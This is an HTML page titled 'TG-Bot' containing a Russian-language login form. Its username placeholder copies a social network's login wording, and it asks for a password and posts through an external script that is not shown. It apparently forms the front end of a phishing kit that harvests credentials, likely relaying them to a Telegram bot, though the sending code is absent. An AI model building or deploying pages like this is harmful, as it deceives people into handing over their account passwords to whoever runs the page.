<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>TG-Bot</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
</head>
<body>

    <div class="container mt-5 pt-5 pb-5">
        <div class="col-md-6 offset-md-3 hero--general">
            <form id="tg">
                <div class="form-group">
                    <label class="form-label">Имя</label>
                    <input style="width: 350px" type="text" name="name" class="form-control" placeholder="Телефон,имя пользователя или эл,адрес">
                </div>
                <div class="form-group">
                    <label class="form-label">Пароль</label>
                    <input style="width: 350px" type="password" name="password" class="form-control" placeholder="Пароль">
                </div>
                <div id="success" class="alert alert-success" role="alert" style="display: none"></div>
                <button type="submit" class="btn btn-primary mt-4">Войти</button>
            </form>
        </div>
    </div>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
<script src="script.js"></script>
</body>
</html>
